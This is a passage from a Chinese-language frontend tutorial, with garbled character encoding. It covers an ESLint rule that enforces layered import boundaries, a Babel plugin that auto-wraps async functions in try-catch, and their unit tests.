            <span class="hljs-attr">source</span>: node.<span class="hljs-property">arguments</span>[<span class="hljs-number">0</span>]
          };
          <span class="hljs-title function_">verifyImport</span>(mockNode);
        }
      }
    };
  }
};
</code></pre>
<h4 data-id="heading-5">3. å•å…ƒæµ‹è¯• (<code>tests/rules/restrict-layer-imports.test.js</code>)</h4>
<p>ESLint æä¾›äº† <code>RuleTester</code> å·¥å…·ï¼Œéå¸¸æ–¹ä¾¿è¿›è¡Œ TDD å¼€å‘ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-meta">'use strict'</span>;

<span class="hljs-keyword">const</span> rule = <span class="hljs-built_in">require</span>(<span class="hljs-string">'../../rules/restrict-layer-imports'</span>);
<span class="hljs-keyword">const</span> { <span class="hljs-title class_">RuleTester</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'eslint'</span>);

<span class="hljs-keyword">const</span> ruleTester = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuleTester</span>({
  <span class="hljs-attr">parserOptions</span>: {
    <span class="hljs-attr">ecmaVersion</span>: <span class="hljs-number">2020</span>,
    <span class="hljs-attr">sourceType</span>: <span class="hljs-string">'module'</span>
  }
});

<span class="hljs-comment">// å®šä¹‰æµ‹è¯•ç”¨ä¾‹</span>
ruleTester.<span class="hljs-title function_">run</span>(<span class="hljs-string">'restrict-layer-imports'</span>, rule, {
  <span class="hljs-comment">// 1. åˆæ³•ä»£ç æµ‹è¯• (Valid)</span>
  <span class="hljs-attr">valid</span>: [
    {
      <span class="hljs-comment">// Service å±‚è°ƒç”¨ API å±‚ -&gt; åˆæ³•</span>
      <span class="hljs-attr">code</span>: <span class="hljs-string">"import { getUser } from '@/api/user';"</span>,
      <span class="hljs-attr">filename</span>: <span class="hljs-string">'/Users/project/src/services/userService.js'</span>
    },
    {
      <span class="hljs-comment">// View å±‚è°ƒç”¨ Service å±‚ -&gt; åˆæ³•</span>
      <span class="hljs-attr">code</span>: <span class="hljs-string">"import { getUserService } from '@/services/userService';"</span>,
      <span class="hljs-attr">filename</span>: <span class="hljs-string">'/Users/project/src/views/UserDetail.vue'</span>
    },
    {
      <span class="hljs-comment">// å¼•å…¥ç¬¬ä¸‰æ–¹åº“ -&gt; åˆæ³•</span>
      <span class="hljs-attr">code</span>: <span class="hljs-string">"import axios from 'axios';"</span>,
      <span class="hljs-attr">filename</span>: <span class="hljs-string">'/Users/project/src/views/UserDetail.vue'</span>
    },
    {
      <span class="hljs-comment">// ç›¸å¯¹è·¯å¾„å¼•ç”¨åŒå±‚çº§æ–‡ä»¶ -&gt; åˆæ³•</span>
      <span class="hljs-attr">code</span>: <span class="hljs-string">"import Header from './Header';"</span>,
      <span class="hljs-attr">filename</span>: <span class="hljs-string">'/Users/project/src/views/Footer.vue'</span>
    }
  ],

  <span class="hljs-comment">// 2. è¿è§„ä»£ç æµ‹è¯• (Invalid)</span>
  <span class="hljs-attr">invalid</span>: [
    {
      <span class="hljs-comment">// View å±‚ç›´æ¥è°ƒç”¨ API å±‚ -&gt; æŠ¥é”™</span>
      <span class="hljs-attr">code</span>: <span class="hljs-string">"import { getUser } from '@/api/user';"</span>,
      <span class="hljs-attr">filename</span>: <span class="hljs-string">'/Users/project/src/views/UserDetail.vue'</span>,
      <span class="hljs-attr">errors</span>: [
        {
          <span class="hljs-attr">message</span>: <span class="hljs-string">'æ¶æ„è¿è§„: "views" å±‚ç¦æ­¢ç›´æ¥å¼•å…¥ "api" å±‚æ¨¡å—ã€‚è¯·é€šè¿‡ Service å±‚ä¸­è½¬ã€‚'</span>,
          <span class="hljs-attr">type</span>: <span class="hljs-string">'Literal'</span> <span class="hljs-comment">// æŠ¥é”™èŠ‚ç‚¹ç±»å‹</span>
        }
      ]
    },
    {
      <span class="hljs-comment">// API å±‚åå‘ä¾èµ– Views å±‚ -&gt; æŠ¥é”™</span>
      <span class="hljs-attr">code</span>: <span class="hljs-string">"import router from '@/views/router';"</span>,
      <span class="hljs-attr">filename</span>: <span class="hljs-string">'/Users/project/src/api/http.js'</span>,
      <span class="hljs-attr">errors</span>: [
        {
          <span class="hljs-attr">message</span>: <span class="hljs-string">'æ¶æ„è¿è§„: "api" å±‚ç¦æ­¢ç›´æ¥å¼•å…¥ "views" å±‚æ¨¡å—ã€‚è¯·é€šè¿‡ Service å±‚ä¸­è½¬ã€‚'</span>
        }
      ]
    },
    {
      <span class="hljs-comment">// åŠ¨æ€ Import ä¹Ÿè¦æ‹¦æˆª</span>
      <span class="hljs-attr">code</span>: <span class="hljs-string">"const api = import('@/api/user');"</span>,
      <span class="hljs-attr">filename</span>: <span class="hljs-string">'/Users/project/src/views/Home.vue'</span>,
      <span class="hljs-attr">parserOptions</span>: { <span class="hljs-attr">ecmaVersion</span>: <span class="hljs-number">2020</span> },
      <span class="hljs-attr">errors</span>: [{ <span class="hljs-attr">messageId</span>: <span class="hljs-string">'restrictedImport'</span> }]
    }
  ]
});
</code></pre>
<hr/>
<h3 data-id="heading-6">ç¬¬ä¸‰éƒ¨åˆ†ï¼šBabel è‡ªå®šä¹‰æ’ä»¶å®æˆ˜ (æ·±åº¦ä»£ç )</h3>
<h4 data-id="heading-7">åœºæ™¯æè¿°</h4>
<p>å‰ç«¯å¼€å‘ä¸­ï¼Œå¼‚æ­¥æ“ä½œå¦‚æœä¸åŠ  <code>try-catch</code>ï¼Œä¸€æ—¦æŠ¥é”™å¯èƒ½å¯¼è‡´é¡µé¢ç™½å±ã€‚æ‰‹åŠ¨ç»™æ¯ä¸ª <code>await</code> åŠ  <code>try-catch</code> å¾ˆç¹çä¸”ä»£ç è‡ƒè‚¿ã€‚
<strong>ç›®æ ‡</strong>ï¼šç¼–å†™ä¸€ä¸ª Babel æ’ä»¶ï¼Œè‡ªåŠ¨è¯†åˆ« <code>async</code> å‡½æ•°ä¸­çš„ <code>await</code> è¯­å¥ï¼Œå¦‚æœå®ƒæ²¡æœ‰è¢« <code>try-catch</code> åŒ…è£¹ï¼Œåˆ™è‡ªåŠ¨åŒ…è£¹ï¼Œå¹¶æ³¨å…¥é”™è¯¯ä¸ŠæŠ¥é€»è¾‘ã€‚</p>
<p><strong>è½¬æ¢å‰</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">getData</span>();
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res);
}
</code></pre>
<p><strong>è½¬æ¢å</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">getData</span>();
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res);
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Auto Captured Error:'</span>, e);
    <span class="hljs-comment">// window.reportError(e); // å¯ä»¥åœ¨æ’ä»¶é…ç½®ä¸­ä¼ å…¥ä¸ŠæŠ¥å‡½æ•°å</span>
  }
}
</code></pre>
<h4 data-id="heading-8">1. Babel æ’ä»¶åŸºç¡€ç»“æ„</h4>
<p>Babel æ’ä»¶å¯¼å‡ºä¸€ä¸ªå‡½æ•°ï¼Œè¿”å›ä¸€ä¸ªåŒ…å« <code>visitor</code> å±æ€§çš„å¯¹è±¡ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// babel-plugin-auto-try-catch.js</span>

<span class="hljs-comment">/**
 * Babel Types åº“æä¾›äº†ç”¨äºæ„å»ºã€éªŒè¯å’Œè½¬æ¢ AST èŠ‚ç‚¹çš„å·¥å…·æ–¹æ³•
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">import('@babel/core')</span>} <span class="hljs-variable">babel</span>
 */</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">babel</span>) {
  <span class="hljs-keyword">const</span> { <span class="hljs-attr">types</span>: t, template } = babel;

  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'babel-plugin-auto-try-catch'</span>,
    <span class="hljs-comment">// visitor æ˜¯è®¿é—®è€…æ¨¡å¼çš„æ ¸å¿ƒ</span>
    <span class="hljs-attr">visitor</span>: {
      <span class="hljs-comment">// æˆ‘ä»¬å…³æ³¨ FunctionDeclaration, FunctionExpression, ArrowFunctionExpression</span>
      <span class="hljs-comment">// å¯ä»¥åˆå¹¶ä¸ºä¸€ä¸ªé€‰æ‹©å™¨ 'Function'</span>
      <span class="hljs-title class_">Function</span>(path, state) {
        <span class="hljs-comment">// 1. å¦‚æœå‡½æ•°ä¸æ˜¯ async çš„ï¼Œè·³è¿‡</span>
        <span class="hljs-keyword">if</span> (!path.<span class="hljs-property">node</span>.<span class="hljs-property">async</span>) {
          <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-comment">// 2. å¦‚æœå‡½æ•°ä½“å·²ç»æ˜¯ç©ºçš„ï¼Œè·³è¿‡</span>
        <span class="hljs-keyword">if</span> (path.<span class="hljs-property">node</span>.<span class="hljs-property">body</span>.<span class="hljs-property">body</span>.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
          <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-comment">// 3. æ£€æŸ¥å‡½æ•°ä½“æ˜¯å¦å·²ç»è¢« try-catch åŒ…è£¹</span>
        <span class="hljs-comment">// è·å–å‡½æ•°ä½“çš„ç¬¬ä¸€æ¡è¯­å¥</span>
        <span class="hljs-keyword">const</span> firstStatement = path.<span class="hljs-property">node</span>.<span class="hljs-property">body</span>.<span class="hljs-property">body</span>[<span class="hljs-number">0</span>];
        <span class="hljs-comment">// å¦‚æœåªæœ‰ä¸€æ¡è¯­å¥ä¸”æ˜¯ TryStatementï¼Œè¯´æ˜å·²ç»å¤„ç†è¿‡æˆ–ç”¨æˆ·æ‰‹åŠ¨å†™äº†ï¼Œè·³è¿‡</span>
        <span class="hljs-keyword">if</span> (path.<span class="hljs-property">node</span>.<span class="hljs-property">body</span>.<span class="hljs-property">body</span>.<span class="hljs-property">length</span> === <span class="hljs-number">1</span> &amp;&amp; t.<span class="hljs-title function_">isTryStatement</span>(firstStatement)) {
          <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-comment">// 4. è·å–ç”¨æˆ·é…ç½®çš„æ’é™¤é¡¹ (ä¾‹å¦‚æ’é™¤æŸäº›æ–‡ä»¶æˆ–å‡½æ•°å)</span>
        <span class="hljs-keyword">const</span> exclude = state.<span class="hljs-property">opts</span>.<span class="hljs-property">exclude</span> || [];
        <span class="hljs-comment">// è·å–å½“å‰å¤„ç†çš„æ–‡ä»¶è·¯å¾„</span>
        <span class="hljs-keyword">const</span> filename = state.<span class="hljs-property">file</span>.<span class="hljs-property">opts</span>.<span class="hljs-property">filename</span> || <span class="hljs-string">'unknown'</span>;
        <span class="hljs-comment">// ç®€å•çš„æ’é™¤é€»è¾‘ç¤ºä¾‹</span>
        <span class="hljs-keyword">if</span> (exclude.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">pattern</span> =&gt;</span> filename.<span class="hljs-title function_">includes</span>(pattern))) {
          <span class="hljs-keyword">return</span>;
        }
        
        <span class="hljs-comment">// 5. å¼€å§‹æ‰§è¡Œè½¬æ¢</span>
        <span class="hljs-comment">// æ ¸å¿ƒé€»è¾‘ï¼šå°†å‡½æ•°ä½“åŸæ¥çš„å†…å®¹ï¼Œå¡å…¥ try å—ä¸­</span>
        
        <span class="hljs-comment">// æ­¥éª¤ A: ç”Ÿæˆ catch å­å¥çš„ error å‚æ•°èŠ‚ç‚¹ (identifier)</span>
        <span class="hljs-comment">// ä½¿ç”¨ path.scope.generateUidIdentifier é˜²æ­¢å˜é‡åå†²çª (ä¾‹å¦‚é˜²æ­¢ç”¨æˆ·åŸä»£ç é‡Œå·²ç»æœ‰ä¸ªå˜é‡å« err)</span>
        <span class="hljs-keyword">const</span> errorParam = path.<span class="hljs-property">scope</span>.<span class="hljs-title function_">generateUidIdentifier</span>(<span class="hljs-string">'err'</span>);

        <span class="hljs-comment">// æ­¥éª¤ B: æ„å»º catch å—çš„å†…å®¹</span>
        <span class="hljs-comment">// è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ ¹æ®é…ç½®ï¼Œç”Ÿæˆ console.error æˆ– reportError è°ƒç”¨</span>
        <span class="hljs-keyword">const</span> reporterName = state.<span class="hljs-property">opts</span>.<span class="hljs-property">reporter</span> || <span class="hljs-string">'console.error'</span>;
        
        <span class="hljs-comment">// ä½¿ç”¨ babel template å¿«é€Ÿæ„å»º AST èŠ‚ç‚¹ï¼Œæ¯”æ‰‹åŠ¨ t.callExpression æ›´ç›´è§‚</span>
        <span class="hljs-comment">// %%err%% æ˜¯å ä½ç¬¦ï¼Œä¼šè¢«æ›¿æ¢ä¸ºä¸Šé¢ç”Ÿæˆçš„ errorParam</span>
        <span class="hljs-keyword">const</span> catchBodyTemplate = template.<span class="hljs-title function_">statement</span>(<span class="hljs-string">`
          <span class="hljs-subst">${reporterName}</span>('Async Error:', %%err%%);
        `</span>);
        
        <span class="hljs-keyword">const</span> catchBlockStatement = t.<span class="hljs-title function_">blockStatement</span>([
          <span class="hljs-title function_">catchBodyTemplate</span>({ <span class="hljs-attr">err</span>: errorParam })
        ]);

        <span class="hljs-comment">// æ­¥éª¤ C: æ„å»º catch å­å¥èŠ‚ç‚¹</span>
        <span class="hljs-keyword">const</span> catchClause = t.<span class="hljs-title function_">catchClause</span>(
          errorParam,
          catchBlockStatement
        );

        <span class="hljs-comment">// æ­¥éª¤ D: æ„å»º try è¯­å¥èŠ‚ç‚¹</span>
        <span class="hljs-comment">// path.node.body æ˜¯ BlockStatementï¼ŒåŒ…å« body å±æ€§ï¼ˆè¯­å¥æ•°ç»„ï¼‰</span>
        <span class="hljs-keyword">const</span> originalBodyStatements = path.<span class="hljs-property">node</span>.<span class="hljs-property">body</span>.<span class="hljs-property">body</span>;
        
        <span class="hljs-keyword">const</span> tryStatement = t.<span class="hljs-title function_">tryStatement</span>(
          t.<span class="hljs-title function_">blockStatement</span>(originalBodyStatements), <span class="hljs-comment">// try å—å†…å®¹</span>
          catchClause, <span class="hljs-comment">// catch å—</span>
          <span class="hljs-literal">null</span> <span class="hljs-comment">// finally å— (å¯é€‰)</span>
        );

        <span class="hljs-comment">// æ­¥éª¤ E: æ›¿æ¢åŸå‡½æ•°ä½“</span>
        <span class="hljs-comment">// æ³¨æ„ï¼šç›´æ¥æ›¿æ¢ body å¯èƒ½ä¼šå¯¼è‡´æ­»å¾ªç¯ï¼ˆå› ä¸ºæ–°ç”Ÿæˆçš„èŠ‚ç‚¹ä¹ŸåŒ…å«å‡½æ•°ä½“ï¼‰ï¼Œ</span>
        <span class="hljs-comment">// ä½†è¿™é‡Œæˆ‘ä»¬è¦æ›¿æ¢çš„æ˜¯ Function çš„ body (BlockStatement) çš„å†…å®¹ï¼Œ</span>
        <span class="hljs-comment">// æˆ–è€…ç›´æ¥æ›¿æ¢ body ä¸ºåŒ…å« tryStatement çš„æ–° BlockStatementã€‚</span>
        
        path.<span class="hljs-title function_">get</span>(<span class="hljs-string">'body'</span>).<span class="hljs-title function_">replaceWith</span>(
          t.<span class="hljs-title function_">blockStatement</span>([tryStatement])
        );

        <span class="hljs-comment">// æ ‡è®°è¯¥èŠ‚ç‚¹å·²è¢«è®¿é—®ï¼Œé¿å…é€’å½’å¤„ç†æ­»å¾ªç¯ (Babel é»˜è®¤ä¼šé‡æ–°è®¿é—®æ–°æ’å…¥çš„èŠ‚ç‚¹)</span>
        path.<span class="hljs-title function_">skip</span>(); 
      }
    }
  };
};
</code></pre>
<h4 data-id="heading-9">2. å¢å¼ºç‰ˆ Babel æ’ä»¶é€»è¾‘ (å¤„ç†ç»†èŠ‚)</h4>
<p>ä¸Šé¢çš„ç‰ˆæœ¬æ¯”è¾ƒç²—æš´ï¼ˆæŠŠæ•´ä¸ªå‡½æ•°ä½“åŒ…èµ·æ¥ï¼‰ã€‚ä½†åœ¨å®é™…ä¸­ï¼Œæˆ‘ä»¬å¯èƒ½åªæƒ³åŒ…è£¹åŒ…å« <code>await</code> çš„ä»£ç æ®µï¼Œæˆ–è€…å¦‚æœç”¨æˆ·å·²ç»å†™äº†éƒ¨åˆ† <code>try-catch</code> è¯¥æ€ä¹ˆåŠï¼Ÿ</p>
<p>ä¸‹é¢æ˜¯æ›´ç²¾ç»†çš„ AST æ“ä½œé€»è¾‘ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è¿›é˜¶å·¥å…·å‡½æ•°ï¼šæ£€æŸ¥ BlockStatement ä¸­æ˜¯å¦åŒ…å« await è¡¨è¾¾å¼</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">hasAwaitExpression</span>(<span class="hljs-params">path</span>) {
  <span class="hljs-keyword">let</span> hasAwait = <span class="hljs-literal">false</span>;
  <span class="hljs-comment">// ä½¿ç”¨ path.traverse å¯ä»¥åœ¨å½“å‰è·¯å¾„ä¸‹è¿›è¡Œå­éå†</span>
  path.<span class="hljs-title function_">traverse</span>({
    <span class="hljs-title class_">AwaitExpression</span>(childPath) {
      <span class="hljs-comment">// å¿…é¡»ç¡®ä¿ await æ˜¯å±äºå½“å‰å‡½æ•°çš„ï¼Œè€Œä¸æ˜¯åµŒå¥—åœ¨å†…éƒ¨å…¶ä»– async å‡½æ•°é‡Œçš„</span>
      <span class="hljs-keyword">const</span> parentFunction = childPath.<span class="hljs-title function_">getFunctionParent</span>();
      <span class="hljs-keyword">if</span> (parentFunction === path) {
        hasAwait = <span class="hljs-literal">true</span>;
        childPath.<span class="hljs-title function_">stop</span>(); <span class="hljs-comment">// æ‰¾åˆ°ä¸€ä¸ªå°±åœæ­¢</span>
      }
    },
    <span class="hljs-comment">// é˜²æ­¢éå†è¿›å…¥å†…éƒ¨å‡½æ•°çš„é™·é˜±</span>
    <span class="hljs-title class_">Function</span>(childPath) {
      childPath.<span class="hljs-title function_">skip</span>();
    }
  });
  <span class="hljs-keyword">return</span> hasAwait;
}

<span class="hljs-comment">// ä¿®æ”¹ visitor éƒ¨åˆ†</span>
<span class="hljs-attr">visitor</span>: {
  <span class="hljs-title class_">Function</span>(path, state) {
    <span class="hljs-keyword">if</span> (!path.<span class="hljs-property">node</span>.<span class="hljs-property">async</span>) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-comment">// è¿›é˜¶ä¼˜åŒ–ï¼šå¦‚æœæ²¡æœ‰ awaitï¼Œå…¶å®ä¸éœ€è¦åŒ…è£¹ try-catch (è™½ç„¶ async å‡½æ•°æŠ¥é”™ä¼šè¿”å› reject promiseï¼Œä½†è¿™é‡Œå‡è®¾åªæ•è· await å¼‚å¸¸)</span>
    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">hasAwaitExpression</span>(path)) {
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// å¤„ç† React/Vue ç»„ä»¶æ–¹æ³•åæ’é™¤</span>
    <span class="hljs-keyword">const</span> functionName = path.<span class="hljs-property">node</span>.<span class="hljs-property">id</span> ? path.<span class="hljs-property">node</span>.<span class="hljs-property">id</span>.<span class="hljs-property">name</span> : <span class="hljs-string">''</span>;
    <span class="hljs-keyword">if</span> ([<span class="hljs-string">'render'</span>, <span class="hljs-string">'setup'</span>, <span class="hljs-string">'componentDidCatch'</span>].<span class="hljs-title function_">includes</span>(functionName)) {
      <span class="hljs-keyword">return</span>;
    }
    
    <span class="hljs-comment">// ... åç»­è½¬æ¢é€»è¾‘åŒä¸Š ...</span>
  }
}
</code></pre>
<h4 data-id="heading-10">3. Babel æ’ä»¶å•å…ƒæµ‹è¯•</h4>
<p>Babel æ’ä»¶æµ‹è¯•é€šå¸¸ä½¿ç”¨ <code>babel-plugin-tester</code> æˆ–ç›´æ¥è°ƒç”¨ <code>@babel/core</code> çš„ <code>transformSync</code>ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> babel = <span class="hljs-built_in">require</span>(<span class="hljs-string">'@babel/core'</span>);
<span class="hljs-keyword">const</span> autoTryCatchPlugin = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./babel-plugin-auto-try-catch'</span>);
<span class="hljs-keyword">const</span> assert = <span class="hljs-built_in">require</span>(<span class="hljs-string">'assert'</span>);

<span class="hljs-comment">// è¾…åŠ©æµ‹è¯•å‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">transform</span>(<span class="hljs-params">code, options = {}</span>) {
  <span class="hljs-keyword">const</span> result = babel.<span class="hljs-title function_">transformSync</span>(code, {
    <span class="hljs-attr">plugins</span>: [
      [autoTryCatchPlugin, options] <span class="hljs-comment">// åŠ è½½æ’ä»¶å¹¶ä¼ å…¥é…ç½®</span>
    ],
    <span class="hljs-comment">// ç¦ç”¨ Babel é»˜è®¤ç”Ÿæˆä¸¥æ ¼æ¨¡å¼ï¼Œå‡å°‘å¹²æ‰°</span>
    <span class="hljs-attr">sourceType</span>: <span class="hljs-string">'script'</span>, 
    <span class="hljs-attr">compact</span>: <span class="hljs-literal">false</span> <span class="hljs-comment">// æ ¼å¼åŒ–è¾“å‡ºä»£ç </span>
  });
  <span class="hljs-keyword">return</span> result.<span class="hljs-property">code</span>;
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'--- å¼€å§‹æµ‹è¯• Babel æ’ä»¶ ---'</span>);

<span class="hljs-comment">// æµ‹è¯•ç”¨ä¾‹ 1: æ™®é€š Async å‡½æ•°è½¬æ¢</span>
<span class="hljs-keyword">const</span> code1 = <span class="hljs-string">`
async function getData() {
  const res = await api.get('/user');
  return res;
}
`</span>;
<span class="hljs-keyword">const</span> output1 = <span class="hljs-title function_">transform</span>(code1);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'[Case 1 Output]:\n'</span>, output1);
<span class="hljs-comment">/*
é¢„æœŸè¾“å‡º:
async function getData() {
  try {
    const res = await api.get('/user');
    return res;
  } catch (_err) {
    console.error('Async Error:', _err);
  }
}
*/</span>
assert.<span class="hljs-title function_">match</span>(output1, <span class="hljs-regexp">/try \{/</span>, <span class="hljs-string">'Case 1 Failed: try block missing'</span>);
assert.<span class="hljs-title function_">match</span>(output1, <span class="hljs-regexp">/catch \(_err\)/</span>, <span class="hljs-string">'Case 1 Failed: catch block missing'</span>);


<span class="hljs-comment">// æµ‹è¯•ç”¨ä¾‹ 2: ç®­å¤´å‡½æ•°è½¬æ¢</span>
<span class="hljs-keyword">const</span> code2 = <span class="hljs-string">`
const doWork = async () =&gt; {
  await sleep(1000);
  console.log('done');
};
`</span>;
<span class="hljs-keyword">const</span> output2 = <span class="hljs-title function_">transform</span>(code2);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'[Case 2 Output]:\n'</span>, output2);
assert.<span class="hljs-title function_">match</span>(output2, <span class="hljs-regexp">/try \{/</span>, <span class="hljs-string">'Case 2 Failed'</span>);


<span class="hljs-comment">// æµ‹è¯•ç”¨ä¾‹ 3: å·²ç»æœ‰ Try-Catch çš„å‡½æ•° (åº”è·³è¿‡)</span>
<span class="hljs-keyword">const</span> code3 = <span class="hljs-string">`
async function safe() {
  try {
    await risky();
  } catch (e) {
    handle(e);
  }
}
`</span>;
<span class="hljs-keyword">const</span> output3 = <span class="hljs-title function_">transform</span>(code3);
<span class="hljs-comment">// è¾“å‡ºåº”è¯¥å’Œè¾“å…¥å‡ ä¹ä¸€æ ·ï¼ˆé™¤äº†æ ¼å¼åŒ–å·®å¼‚ï¼‰</span>
<span class="hljs-comment">// æˆ‘ä»¬é€šè¿‡åˆ¤æ–­ catch å—çš„æ•°é‡æ¥éªŒè¯æ²¡æœ‰é‡å¤æ’å…¥</span>
<span class="hljs-keyword">const</span> catchCount = (output3.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/catch/g</span>) || []).<span class="hljs-property">length</span>;
assert.<span class="hljs-title function_">strictEqual</span>(catchCount, <span class="hljs-number">1</span>, <span class="hljs-string">'Case 3 Failed: Should not add extra try-catch'</span>);


<span class="hljs-comment">// æµ‹è¯•ç”¨ä¾‹ 4: è‡ªå®šä¹‰ Reporter é…ç½®</span>
<span class="hljs-keyword">const</span> code4 = <span class="hljs-string">`async function test() { await fn(); }`</span>;
<span class="hljs-keyword">const</span> output4 = <span class="hljs-title function_">transform</span>(code4, { <span class="hljs-attr">reporter</span>: <span class="hljs-string">'window.reportToSentry'</span> });
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'[Case 4 Output]:\n'</span>, output4);
assert.<span class="hljs-title function_">match</span>(output4, <span class="hljs-regexp">/window\.reportToSentry/</span>, <span class="hljs-string">'Case 4 Failed: Custom reporter not working'</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'--- æ‰€æœ‰æµ‹è¯•é€šè¿‡ ---'</span>);
</code></pre>
<hr/>
<h3 data-id="heading-11">ç¬¬å››éƒ¨åˆ†ï¼šåº•å±‚æœºåˆ¶æ·±åº¦å¯¹æ¯”</h3>
<p>è¿™éƒ¨åˆ†è§£é‡Šä¸ºä»€ä¹ˆä»£ç è¦è¿™ä¹ˆå†™ï¼Œè¿™å¯¹äºç†è§£ 1000 è¡Œçº§åˆ«çš„å¤æ‚æ’ä»¶å¼€å‘è‡³å…³é‡è¦ã€‚</p>
<h4 data-id="heading-12">1. éå†æœºåˆ¶ï¼šScope (ä½œç”¨åŸŸ) ç®¡ç†</h4>
<p>è¿™æ˜¯ Babel å’Œ ESLint æ’ä»¶å¼€å‘ä¸­æœ€éš¾çš„éƒ¨åˆ†ã€‚</p>
<ul>
<li>
<p><strong>ESLint</strong>:</p>
<ul>
<li><code>context.getScope()</code> è·å–å½“å‰èŠ‚ç‚¹çš„ä½œç”¨åŸŸã€‚</li>
<li>ä¸»è¦ç”¨äºæŸ¥æ‰¾å˜é‡å®šä¹‰ï¼ˆReferencesï¼‰ã€‚ä¾‹å¦‚ï¼š<code>no-undef</code> è§„åˆ™å°±æ˜¯é€šè¿‡éå† Scope ä¸­çš„ references åˆ—è¡¨ï¼Œçœ‹æ˜¯å¦æœ‰æœªå®šä¹‰çš„å˜é‡ã€‚</li>
<li>ESLint çš„ Scope åˆ†ææ˜¯<strong>é™æ€åªè¯»</strong>çš„ã€‚ä½ ä¸èƒ½åœ¨ lint è¿‡ç¨‹ä¸­ä¿®æ”¹ Scopeã€‚</li>
</ul>
</li>
<li>
<p><strong>Babel</strong>:</p>
<ul>
<li><code>path.scope</code> å¯¹è±¡éå¸¸å¼ºå¤§ã€‚</li>
<li><code>path.scope.generateUidIdentifier('name')</code>ï¼šè‡ªåŠ¨ç”Ÿæˆå”¯ä¸€å˜é‡åï¼ˆå¦‚ <code>_name</code>, <code>_name2</code>ï¼‰ï¼Œè¿™åœ¨è½¬æ¢ä»£ç æ³¨å…¥å˜é‡æ—¶å¿…ä¸å¯å°‘ï¼ˆå¦‚ä¸Šé¢ <code>try-catch</code> ä¸­çš„ <code>err</code>ï¼‰ã€‚</li>
<li><code>path.scope.push({ id: ... })</code>ï¼šå¯ä»¥å°†å˜é‡å£°æ˜æå‡åˆ°ä½œç”¨åŸŸé¡¶éƒ¨ã€‚</li>
<li><strong>Binding</strong>ï¼šBabel ç»´æŠ¤äº†æå…¶è¯¦ç»†çš„å˜é‡ç»‘å®šä¿¡æ¯ã€‚ä½ å¯ä»¥é€šè¿‡ <code>path.scope.bindings['x']</code> æ‰¾åˆ°å˜é‡ <code>x</code> çš„æ‰€æœ‰å¼•ç”¨ä½ç½®ï¼ˆ<code>referencePaths</code>ï¼‰å’Œèµ‹å€¼ä½ç½®ï¼ˆ<code>constantViolations</code>ï¼‰ã€‚è¿™ä½¿å¾—åšâ€œæ­»ä»£ç æ¶ˆé™¤â€æˆ–â€œå¸¸é‡æŠ˜å â€æˆä¸ºå¯èƒ½ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-13">2. çŠ¶æ€ç®¡ç† (State)</h4>
<ul>
<li>
<p><strong>ESLint</strong>:</p>
<ul>
<li>çŠ¶æ€é€šå¸¸ä¿å­˜åœ¨é—­åŒ…å˜é‡ä¸­ï¼Œæˆ–è€… <code>create</code> å‡½æ•°çš„å±€éƒ¨å˜é‡ä¸­ã€‚</li>
<li>å› ä¸º ESLint æ˜¯æŒ‰æ–‡ä»¶å¤„ç†çš„ï¼Œ<code>create</code> æ¯æ¬¡å¤„ç†æ–°æ–‡ä»¶éƒ½ä¼šé‡æ–°æ‰§è¡Œï¼Œæ‰€ä»¥é—­åŒ…å˜é‡æ˜¯æ–‡ä»¶éš”ç¦»çš„ã€‚</li>
<li>å¦‚æœéœ€è¦è·¨æ–‡ä»¶ä¿¡æ¯ï¼ˆæå…¶å°‘è§ä¸”ä¸æ¨èï¼Œå› ä¸ºç ´åç¼“å­˜ï¼‰ï¼Œéœ€è¦ç”¨åˆ°å…¨å±€å•ä¾‹ã€‚</li>
</ul>
</li>
<li>
<p><strong>Babel</strong>:</p>
<ul>
